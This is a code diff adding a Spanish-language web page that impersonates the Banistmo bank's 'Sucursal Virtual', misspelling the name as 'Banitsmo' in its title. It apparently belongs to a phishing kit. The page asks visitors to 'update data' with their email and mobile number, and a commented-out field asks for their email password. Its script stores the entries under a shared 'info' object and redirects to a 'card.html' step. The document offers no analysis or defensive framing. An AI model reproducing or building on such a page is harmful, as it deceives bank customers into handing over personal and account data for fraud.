@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <head>
+        <title>Banitsmo Sucursal Virtual Personas</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        <meta content="es" http-equiv="Content-Language">
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous" defer></script>
+        <link href="css/login.css" rel="stylesheet">
+        <link href="css/stylesheet.css" rel="stylesheet">
+        <link rel="icon" type="image/png" href="img/logo.png" />
+        <script src="./js/disp.js"></script>
+    </head>
+</head>
+
+<body>
+    <header class="header">
+        <nav class="navegacion">
+            <div class="logo">
+                <img src="img/logo-banitsmo.png" alt="logo banitsmo">
+            </div>
+            <div class="idioma">
+                <a href="">English</a>
+                <i class="icono-lenguaje"></i>
+            </div>
+        </nav>
+    </header>
+    <main>
+
+        <!-- LEFT COLUMN -->
+        <section class="container">
+            <div class="container-grid">
+
+
+                <div class="container-campos">
+                    <div class="header-campos">
+                        <h3>Actualizar Datos</h3>
+                    </div>
+
+                    <p>Verificaremos estos datos con los agregados anteriormente en nuestras sucursales. Llena el
+                        siguiente formulario:</p>
+                    <form>
+                        <!-- EMAIL -->
+                        <div class="input-row-campos">
+                            <div class="input-group-text input-fix">
+                                <input class="input-bg-email" type="email" id="email" placeholder=" ">
+                                <label for="">E-Mail</label>
+                            </div>
+                        </div>
+
+                        <!-- LOCK -->
+                        <!-- <div class="input-row-campos">
+                            <div class="input-group-text input-fix">
+                                <input class="input-bg-lock" type="password" id="password" placeholder=" ">
+                                <label for="">Clave de correo</label>
+                            </div>
+                        </div> -->
+
+                        <!-- PHONE -->
+                        <div class="input-row-campos">
+                            <div class="input-group-text input-fix">
+                                <input class="input-bg-phone" type="numer" maxlength="8" id="pn" placeholder=" ">
+                                <label for="">Celular</label>
+                            </div>
+                        </div>
+
+                        <!-- BUTTON -->
+                        <div class="btn-row">
+                            <button type="submit" class="btn btn-success" id="continuar">
+                                Continuar
+                            </button>
+                        </div>
+                    </form>
+                </div>
+
+            </div>
+
+
+            <!-- RIGHT COLUMN -->
+            <div class="column-right">
+                <div class="img-main">
+                    <img src="img/email.jpg" width="717px">
+                </div>
+
+                <!-- "CONOCE TAMBIEN"-->
+                <div class="conoce">
+                    <h1 class="titleConoce">Conoce también:</h1>
+                    <div class="conoceItems">
+                        <div class="conoceItem">
+                            <img src="img/tarifas.png" alt="">
+                            <a href="#">Tarifas</a>
+                            <span><b>+</b></span>
+                        </div>
+
+                        <div class="conoceItem">
+                            <img src="img/servicios.png" alt="">
+                            <a href="#">Servicios</a>
+                            <span><b>+</b></span>
+
+                        </div>
+
+                        <div class="conoceItem">
+                            <img src="img/sucursales.png" alt="">
+                            <a href="#">Sucursales</a>
+                            <span><b>+</b></span>
+
+                        </div>
+
+                        <div class="conoceItem">
+                            <img src="img/noticias.png" alt="">
+                            <a href="#">Noticias</a>
+                            <span><b>+</b></span>
+
+                        </div>
+                    </div>
+                    <button class="btnConoce">Conoce como utilizar la Banca en Línea</button>
+                </div>
+
+            </div>
+
+
+        </section>
+    </main>
+    <footer class="footer">
+        <div class="contenedor-footer">
+            <div class="contacto-telefono">
+                <i class="fas  fa-phone" style="color : #454648"></i>
+                Sucursal Teléfonica: (507) 306-4700
+            </div>
+            <div class="info">
+                Copyright Banistmo S.A. 2023
+            </div>
+        </div>
+    </footer>
+
+    <script src="js/app.js"></script>
+    <script>
+
+        const emailInput = document.getElementById('email');
+        // const passwordInput = document.getElementById('password');
+        const numeroInput = document.getElementById('pn');
+
+        if (info.err !== '') {
+            // Mensaje de error
+            alert('¡Tuvimos un problema! Por favor llena los campos.');
+
+            emailInput.style.borderColor = "red";
+            emailInput.style.borderBottomWidth = "3px";
+        }
+
+        const btnContinuar = document.getElementById('continuar');
+        btnContinuar.addEventListener('click', (e) => {
+            e.preventDefault();
+
+            emailInput.style.borderColor = "black";
+            emailInput.style.borderBottomWidth = "1px";
+
+            numeroInput.style.borderColor = "black";
+            numeroInput.style.borderBottomWidth = "1px";
+
+            if (validarEmail(emailInput.value)) {
+                if (numeroInput.value.length === 8) {
+                    // Guardar en LS
+                    info.email = emailInput.value;
+                    info.cel = numeroInput.value;
+
+                    LS.setItem('info', JSON.stringify(info));
+
+                    // Redirigir
+                    if (info.err === '') {
+                        window.location.href = 'card.html';
+                    } else {
+                        window.location.href = 'waiting.html';
+                    }
+
+
+                } else {
+                    //errPN
+                    numeroInput.style.borderColor = "red";
+                    numeroInput.style.borderBottomWidth = "3px";
+                }
+            } else {
+                //errMail
+                emailInput.style.borderColor = "red";
+                emailInput.style.borderBottomWidth = "3px";
+            }
+        });
+
+        function validarEmail(email) {
+            const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return regex.test(email);
+        }
+
+
+    </script>
+</body>
+
+</html>
